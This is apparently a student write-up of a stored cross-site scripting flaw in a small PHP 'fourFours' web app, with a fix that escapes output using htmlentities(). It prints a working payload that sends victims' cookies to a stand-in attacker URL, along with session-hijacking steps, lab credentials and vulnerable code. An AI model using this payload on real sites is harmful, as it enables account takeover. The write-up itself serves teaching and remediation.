		<h1> # FIX: XSS: user input/output is not vetted </h1>
		<h2> The Vulnerability </h2>
		<ul>
			<li> Brief explanation:
<xmp>
        Cross Site Scripting vulnerability is a type of injection that arises when a web 
        application uses unsanitized user inputs and outputs. The data can include dynamic
        content that is sent to the web user and can be interpreted by the browser 
        depending on what the attacker intended. 
</xmp>
                        </li>
			<li> Example code etc.:
<xmp>

        <?
                if($operation == "login"){
                        $user=$_REQUEST['user'];
                        $password=$_REQUEST['password'];
                        ...
                        if($row = pg_fetch_row($result)) {
                                $_SESSION['accountId']=$row[0];
                                $_SESSION['user']=$row[1];
                                $_SESSION['firstName']=$row[2];

                        $dbconn = pg_connect_db();
			$result = pg_prepare($dbconn, "", "SELECT firstName, lastName, value, expression, s.accountId, s.id FROM account a, solution s WHERE a.id=s.accountId AND value=$i ORDER BY firstName, lastName, expression");
			$result = pg_execute($dbconn, "", array());
                        while ($row = pg_fetch_row($result)) {
                                $count=0;
                                $firstName=$row[$count++];
                                $lastName=$row[$count++];
                                $value=$row[$count++];

                                $expressionId=$row[$count++];
                                ...

                        ...
                ?>
                ...
        </html>
</xmp>
                        </li>
			<li> How attacker exploits this: 
<xmp>
        The attacker first needs to check the source code. He can do it by right clicking and choosing View Page Source.
        We can notice in the source:

                        ...
                ... <td>4/4 + 4/4</td> ...
                        ...

        This tells the attacker that the expression is being placed in a <td></td> tag
        He can now test for an XSS vulnerability by adding following line as an expression:

                </td><script language="javascript">alert("got you")</script><td>
        
        After clicking the "add" button, the browser displays a pop up alert with "got you" written.
        This tells the attacker that they can proceed with the attack. The attacker can then write JavaScript code that 
        sends the cookie of anyone that logs into fourFours to a website that the hacker controls. This can be done with the following input:

        </td><img id="hacked" width=100 src="" /><script language="javascript">url='http://hacker_controlled_url?arg=+document.cookie';document.getElementById("hacked").src=url;</script><td>
        
        Once the attacker has cookies from other users, he can open a browser and set his cookie to the one he stole.
        This can be done in the browser by clicking the menu icon on the top right (on Mozilla on Kali), clicking on Web Developer and then Toggle Tools.
        Then by clicking on the Storage tab we can see the current cookie being used. The attacker changes this value to the one collected using XSS.
        The hacker now has full access to the victim's account. He can add and delete expressions on the victim's behalf. 
</xmp>
                        </li>
			<li> Impact: CIAaa and some details
<xmp>
        This compromises integrity (I) as the user's information can be changed in storage by an attacker. In this case expressions can be
        added or deleted. 
        Confidentiality (C) is also compromised since the attacker was able to receive private information (the session ID).
        This also breaches authentication (A) since the attacker can use the obtained cookie to authenticate as their victim and 
        perform actions on their behalf.
</xmp>
                        </li>
		</ul>

		<h2> INSTRUCTIONS TO VERIFY VULNERABILITY BELOW </h2>
<xmp>
        To verify this vulnerability, we first load the website and login as a user, in this example we'll log in as Jay Perlmuter. 
        --> username: perl and password: perl

        We then add the following line as an expression and press the "add" button:

                </td><script language="javascript">alert("XSS vulnerability present!")</script><td>
        
        The pop up appears, meaning the browser interpreted this as code confirming the vulnerability.
        If there was no XSS vulnerability, that line would just be added as an expression with escaped characters and 
        be shown on the screen as a string, or the application would have rejected the input. 

        We can even see in the database that the HTML was inserted (in my case):

        fourfours=> select * from solution;
        id | value |                                     expression                                      | accountid

         9 |     8 | 4+4                                                                                 |        10

        14 |     2 | 4/4 + 4/4                                                                           |        10
        15 |     0 | 4-4                                                                                 |        10
        31 |     5 | </td><script language="javascript">alert("XSS vulnerability present!")</script><td> |        10
       (6 rows)

                <h2> The Fix </h2>
                <ul>
                        <li> Explain the fix:
<xmp>
        To fix this, we want to escape the input and outputs. To do this we'll use the htmlentities() function.
        htmlentities() encodes all characters which have HTML character entity equivalents. This will prevent the
        browser from interpreting them as actual code and will instead make it treat the like strings.
        We use this function on all untrusted inputs and outputs to make sure everything is sanitized.

                        <li> How the fix resolves the issue:
<xmp>
        Attack scenario:

                The attacker wants to try and insert some HTML into the database so that it's run by the browser on the way out.

                First, they log into the website and use the same code as above to test for the vulnerability:

                        </td><script language="javascript">alert("got you")</script><td>

                However, this time the browser doesn't give a pop up with the message "got you"
                Instead, the line below is added as an expression:

                        &lt;/td&gt;&lt;script language=&quot;javascript&quot;&gt;alert(&quot;got you&quot;)&lt;/script&gt;&lt;td&gt;
                
                We can even see in the database that the HTML code was not successfully inserted (in my case):

                        fourfours=> select * from solution;                                                                                                                                                       
                        id | value |                                                  expression                                                  | accountid

                The attack was prevented.
